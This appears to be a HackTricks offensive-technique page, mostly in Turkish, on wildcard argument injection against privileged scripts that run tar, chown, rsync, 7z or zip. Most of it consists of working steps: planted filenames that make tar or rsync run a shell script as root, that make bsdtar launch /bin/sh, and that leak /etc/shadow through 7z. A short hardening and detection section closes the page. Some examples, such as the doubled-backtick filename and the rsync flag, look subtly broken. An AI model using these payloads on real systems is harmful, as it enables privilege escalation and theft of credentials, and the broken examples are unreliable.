# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **argüman enjeksiyonu**, ayrıcalıklı bir betik `tar`, `chown`, `rsync`, `zip`, `7z`, … gibi bir Unix ikili dosyasını, tırnak işareti olmadan bir wildcard ile çalıştırdığında gerçekleşir. 
> Shell, wildcard'ı **ikili dosyayı çalıştırmadan önce** genişlettiğinden, çalışma dizininde dosya oluşturabilen bir saldırgan, `-` ile başlayan dosya adları oluşturabilir, böylece bunlar **veri yerine seçenekler** olarak yorumlanır ve etkili bir şekilde rastgele bayraklar veya hatta komutlar gizlenebilir. 
> Bu sayfa, 2023-2025 için en yararlı ilkelere, son araştırmalara ve modern tespitlere dair bilgileri toplar.

## chown / chmod

`--reference` bayrağını kötüye kullanarak **rastgele bir dosyanın sahipliğini/grubunu veya izin bitlerini kopyalayabilirsiniz**:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Kök daha sonra şöyle bir şey çalıştırdığında:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` enjekte edilir, bu da *tüm* eşleşen dosyaların `/root/secret``file`'ın sahipliğini/izinlerini miras almasına neden olur.

*PoC & araç*: [`wildpwn`](https://github.com/localh0t/wildpwn) (birleşik saldırı).
Ayrıntılar için klasik DefenseCode makalesine de bakın.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

**checkpoint** özelliğini kötüye kullanarak rastgele komutlar çalıştırın:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Bir kez root `tar -czf /root/backup.tgz *` komutunu çalıştırdığında, `shell.sh` root olarak çalıştırılır.

### bsdtar / macOS 14+

Son macOS'taki varsayılan `tar` (`libarchive` tabanlı) `--checkpoint`'i *uygulamaz*, ancak dış bir sıkıştırıcı belirtmenize olanak tanıyan **--use-compress-program** bayrağı ile kod yürütme elde edebilirsiniz.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Bir ayrıcalıklı betik `tar -cf backup.tar *` çalıştırdığında, `/bin/sh` başlatılacaktır.

---

## rsync

`rsync`, uzaktan kabuğu veya hatta uzaktan ikili dosyayı `-e` veya `--rsync-path` ile başlayan komut satırı bayrakları aracılığıyla geçersiz kılmanıza olanak tanır:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Eğer root daha sonra dizini `rsync -az * backup:/srv/` ile arşivlerse, enjekte edilen bayrak uzaktaki tarafınızda shell'inizi başlatır.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` modu).

---

## 7-Zip / 7z / 7za

Yetkili script *savunmacı* bir şekilde joker karakteri `--` ile öne eklese bile (seçenek ayrıştırmasını durdurmak için), 7-Zip formatı **dosya liste dosyalarını** dosya adını `@` ile öne ekleyerek destekler. Bunu bir sembolik bağlantı ile birleştirmek, *rastgele dosyaları dışarı aktarmanıza* olanak tanır:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Eğer root şöyle bir şey çalıştırırsa:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip, `root.txt` dosyasını (→ `/etc/shadow`) bir dosya listesi olarak okumaya çalışacak ve çıkacaktır, **içeriği stderr'ye yazdıracaktır**.

---

## zip

`zip`, arşiv test edileceğinde sistem kabuğuna *kelimesi kelimesine* iletilen `--unzip-command` bayrağını destekler:
```bash
zip result.zip files -T --unzip-command "sh -c id"
```
Inject the flag via a crafted filename and wait for the privileged backup script to call `zip -T` (test archive) on the resulting file.

---

## Ekstra ikili dosyalar wildcard enjeksiyonuna karşı savunmasız (2023-2025 hızlı listesi)

Aşağıdaki komutlar modern CTF'lerde ve gerçek ortamlarda kötüye kullanılmıştır. Payload her zaman daha sonra bir wildcard ile işlenecek yazılabilir bir dizin içinde bir *dosya adı* olarak oluşturulur:

| İkili | Kötüye kullanılacak flag | Etki |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → keyfi `@file` | Dosya içeriğini oku |
| `flock` | `-c <cmd>` | Komutu çalıştır |
| `git`   | `-c core.sshCommand=<cmd>` | SSH üzerinden git ile komut çalıştırma |
| `scp`   | `-S <cmd>` | ssh yerine keyfi program başlat |

Bu primitifler *tar/rsync/zip* klasiklerinden daha az yaygındır ancak avlanırken kontrol etmeye değer.

---

## Tespit & Güçlendirme

1. **Kritik betiklerde shell globbing'i devre dışı bırakın**: `set -f` (`set -o noglob`) wildcard genişlemesini engeller.
2. **Argümanları alıntılayın veya kaçırın**: `tar -czf "$dst" -- *` *güvenli değildir* — `find . -type f -print0 | xargs -0 tar -czf "$dst"` tercih edilmelidir.
3. **Açık yollar**: `*` yerine `/var/www/html/*.log` kullanın, böylece saldırganlar `-` ile başlayan kardeş dosyalar oluşturamaz.
4. **En az ayrıcalık**: Mümkünse yedekleme/bakım işlerini root yerine ayrıcalıksız bir hizmet hesabı olarak çalıştırın.
5. **İzleme**: Elastic’in önceden oluşturulmuş kuralı *Wildcard Enjeksiyonu ile Potansiyel Shell* `tar --checkpoint=*`, `rsync -e*` veya `zip --unzip-command` ile hemen ardından bir shell alt süreci arar. EQL sorgusu diğer EDR'ler için uyarlanabilir.

---

## Referanslar

* Elastic Security – Potansiyel Shell via Wildcard Injection Tespit edildi kuralı (son güncelleme 2025)
* Rutger Flohil – “macOS — Tar wildcard enjeksiyonu” (18 Aralık 2024)

{{#include ../../banners/hacktricks-training.md}}
